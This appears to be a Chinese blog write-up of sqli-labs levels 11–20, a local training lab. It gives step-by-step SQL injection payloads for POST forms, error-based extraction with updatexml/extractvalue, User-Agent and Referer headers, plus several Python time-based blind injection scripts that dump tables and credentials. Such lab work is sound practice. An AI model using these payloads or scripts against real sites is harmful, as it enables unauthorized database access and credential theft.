<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206022256838.png" alt="image-20220602225600775"></p>
<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>到了11关，就开始post注入了，之前写的检测闭合也就不管用了，第一次碰到post注入，有点懵，不知道怎么搞好，本来以为输入万能密码能登录进去。最后还是靠着输入\利用报错得到闭合符’,接下来</p>
<p><strong>测字段</strong>：admin’ order by 2 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206052252604.png" alt="image-20220605225210570"></p>
<p><strong>爆数据库与版本：</strong>-1’ union select database(),version() #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206052211931.png" alt="image-20220605221140837"></p>
<p><strong>爆表</strong>：1’  union select (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() ),2 #</p>
<p>-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061343920.png" alt="image-20220606134253861"></p>
<p><strong>查字段名：</strong>1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema &#x3D; database()) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061349734.png" alt="image-20220606134936694"></p>
<p><strong>爆账号和密码：</strong></p>
<p>1’ union select (select group_concat(username) from users),(select group_concat(password) from users) #</p>
<p>或</p>
<p>1’ union select (select group_concat(concat_ws(‘~’,username,password)) from users),2 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061354152.png" alt="image-20220606135429104"></p>
<h4 id="Less-12："><a href="#Less-12：" class="headerlink" title="Less-12："></a><strong>Less-12</strong>：</h4><p>首先\试试水，这里显示报错了，说明是”)闭合</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061355369.png" alt="image-20220606135526334"></p>
<p><strong>字段：</strong>admin”) order by 2 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061418049.png" alt="image-20220606141838012"></p>
<p><strong>爆数据库与版本</strong>：-1”) union select database(),version() #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061403926.png" alt="image-20220606140307894"></p>
<p><strong>爆表名：</strong>-1”) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061421789.png" alt="image-20220606142113753"></p>
<p><strong>爆字段名：</strong>-1”) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name&#x3D; ‘users’) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061429310.png" alt="image-20220606142934275"></p>
<p><strong>爆账号密码：</strong>1”) union select (select group_concat(concat_ws(‘~’,username,password)) from users),2 #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061439797.png" alt="image-20220606143922758"></p>
<h4 id="Less-13-14"><a href="#Less-13-14" class="headerlink" title="Less-13-14"></a>Less-13-14</h4><p>老样子\判断出闭合这里发现是’)闭合，测出了字段为2却没有任何回显。一开始是觉得用时间盲注，但反复测试发现都没用，网上查了查发现是报错注入，第一次做报错注入，有点生疏</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206062213618.png" alt="image-20220606221351542"></p>
<p>用一个简单的报错注入成功爆出数据库</p>
<h5 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h5><p>也是一样用\判断出闭符”，我就不一一列举了，下面以13题为为例</p>
<p><strong>爆出数据库</strong>：’) and (extractvalue(1,concat(0x7e,(select database()),0x7e))) # </p>
<p>**爆出版本’) and (extractvalue(1,concat(0x7e,(select version()),0x7e))) # **</p>
<p><strong><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206062237295.png" alt="image-20220606223729261"></strong></p>
<p><strong>爆出表名</strong>：’) and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),0x7e))) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206071024020.png" alt="image-20220607102430981"></p>
<p><strong>爆字段</strong>：’) and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206071014183.png" alt="image-20220607101439093"></p>
<p><strong>爆账号密码</strong>：’) and  (updatexml(1,concat(0x7e,(select group_concat(concat_ws(‘~’,username,password)) from users),0x7e),1))#</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206071039018.png" alt="image-20220607103946985"></p>
<h4 id="Less-15-16"><a href="#Less-15-16" class="headerlink" title="Less-15-16"></a>Less-15-16</h4><h5 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h5><p>这里输入\并没有回显报错信息，但输入正确的账号和密码后，下方的图片会变换，所以初步判定为时间盲注。手工测试的闭合符为’</p>
<h5 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h5><p>手工测试的闭合符为”),下面以15关为例</p>
<p><strong>测字段数：admin’ order by 2#</strong><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206141251208.png" alt="image-20220614125139144"></p>
<p><strong>爆数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">            for j in range(91, 127):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; union select 1,if(substr(database(),%d,1)=&#x27;%c&#x27;,sleep(3),0)#&quot;%(i,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line"></span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172001738.png" alt="image-20220617200136665"></p>
<p><strong>数据库版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(1):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">            for j in range(0, 10):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; union select 1,if(substr(version(),%d,1)=&#x27;%d&#x27;,sleep(3),0)#&quot;%(i,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: j, &quot;payload&quot;: payload&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line"></span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;.&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172028444.png" alt="image-20220617202848381"></p>
<p><strong>爆表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from threading import Thread,Lock</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">        for z in range(1, 15):</span><br><span class="line">            for j in range(91, 127):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; and if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(3),0)#&quot;%(i,z,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload,&quot;page&quot;:i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    global page_1</span><br><span class="line">    lock.acquire()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    lock.release()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    page_1 = 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于python的多线程竞争问题，所以加了锁，但这也同样导致了多线程变成了单线程   T_T</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206171947257.png" alt="image-20220617194710105"></p>
<p>爆字段名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from threading import Thread,Lock</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">        for z in range(1, 15):</span><br><span class="line">            for j in range(91, 127):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(5),0)#&quot;%(i,z,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload,&quot;page&quot;:i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    global page_1</span><br><span class="line">    lock.acquire()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    lock.release()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    page_1 = 0</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172047468.png" alt="image-20220617204746404"></p>
<p><strong>账号密码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from threading import Thread,Lock</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">        for z in range(1, 105):</span><br><span class="line">            for j in range(43,96):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; and if(substr((select group_concat(username) from users),%d,1)=&#x27;%c&#x27;,sleep(5),0)#&quot;%(z,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                if j &gt;= 65:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j+32), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload,&quot;page&quot;:i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    global page_1</span><br><span class="line">    lock.acquire()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    lock.release()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    page_1 = 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172158250.png" alt="image-20220617215838190"></p>
<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><p>这题做的无头无序的，卡了很长时间，百度后看了别人审计源码，从而得知注入点在password又因为这个是修改密码，只要用户名存在，password处不管输什么都返回正确页面，所以这题只能用报错注入来做</p>
<p><strong>爆数据库名：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select database()),0x7e),1))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111139846.png" alt="image-20220711113925734"></p>
<p><strong>爆数据库版本：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select version()),0x7e),1))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111142110.png" alt="image-20220711114209045"></p>
<p><strong>爆表：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select (select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())),0x7e),1))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111144776.png" alt="image-20220711114426710"></p>
<p><strong>爆字段名：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select (select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’)),0x7e),1))–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111217184.png" alt="image-20220711121718115"></p>
<p><strong>爆账号密码：</strong>uname&#x3D;admin&amp;passwd&#x3D;-1’ and updatexml(1,concat(0x7e,(select group_concat(username) from (select username from users)a)),1)#</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111357965.png" alt="image-20220711135756894"></p>
<h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>首先访问页面，会显示本机ip地址。</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207151949096.png" alt="image-20220715194921025"></p>
<p>一开始想的是修改bp中的X-Forwarded-For进行绕过ip，但输入正确的账号密码后却显示了User-Agent</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207151953938.png" alt="image-20220715195308888"></p>
<p>那么注入点大概率会出现在User-Agent上面，尝试修改User-Agent后发现也能成功回显</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207151958130.png" alt="image-20220715195841087"></p>
<p>然后根据网上的wp得知User-Agent与数据库进行交互从而得知注入点就是在User-Agent上面。那么开始构造payload</p>
<p><strong>爆出数据库</strong>：’ or updatexml(1,concat(0x7e,database(),0x7e),1),’’,’’) ##</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207152010773.png" alt="image-20220715201028727"></p>
<p>这里需要注意这是登录成功的条件下才能触发的，而且既然是insert注入，需要用,’’,’’)闭合后面的 sql 语句，否则就是语法错误了.</p>
<p><strong>爆数据库版本名</strong>：’ or updatexml(1,concat(0x7e,version(),0x7e),1),’’,’’) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161556519.png" alt="image-20220716155606415"></p>
<p><strong>爆表名</strong>：’ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1),’’,’’) #<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161558691.png" alt="image-20220716155818639"></p>
<p><strong>爆字段</strong>：’ or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e),1),’’,’’) #<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161600028.png" alt="image-20220716160005979"></p>
<p><strong>爆账号密码</strong>：’ or updatexml(1,concat(0x7e,(select group_concat(concat_ws(‘~’,username,password)) from users),0x7e),1),’’,’’) #</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161602875.png" alt="image-20220716160248828"></p>
<h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>访问并输入正确账号和密码的页面</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221619554.png" alt="image-20220722161919472"></p>
<p>这题同样是用报错注入过，通过测试闭合符发现只有单引号会报错，所以闭合符为单引号</p>
<p>注入点在Referer上</p>
<p><strong>payload：</strong>‘ or updatexml(1,concat(0x7e,database(),0x7e),1),’’,’’) #</p>
<h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>访问页面</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221626381.png" alt="image-20220722162641317"></p>
<p>输入正确的账号和密码后是这样的</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221627093.png" alt="image-20220722162710032"></p>
